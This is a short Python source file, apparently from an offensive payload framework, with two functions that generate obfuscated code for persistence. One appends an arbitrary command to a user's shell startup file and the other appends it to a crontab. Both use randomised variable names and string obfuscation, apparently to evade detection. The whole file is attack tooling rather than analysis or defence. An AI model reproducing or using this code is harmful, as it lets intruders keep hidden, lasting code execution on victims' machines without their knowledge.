from payloads.helpers.string import random_string
from payloads.modules.python.common import obfuscate_python_string


def rcfile_append(shell, rcfile, command):
    var_file = random_string(length_minimum=10, length_maximum=20)

    code = "import os;\n"
    code += "if {0} in os.getenv({1}):\n".format(obfuscate_python_string(shell), obfuscate_python_string("SHELL"))
    code += "    {0}=open(os.path.expanduser({1}),'a');".format(var_file, obfuscate_python_string(rcfile))
    code += "{0}.write({1});".format(var_file, obfuscate_python_string(command + "\n"))
    code += "{0}.close();\n".format(var_file)
    return code


def crontab_append(crontab_path, cron_expression, command):
    var_file = random_string(length_minimum=10, length_maximum=20)

    code = "import os;"
    code += "{0}=open({1},'a');".format(var_file, obfuscate_python_string(crontab_path))
    code += "{0}.write({1});".format(var_file, obfuscate_python_string(cron_expression + " " + command + "\n"))
    code += "{0}.close();\n".format(var_file)
    return code
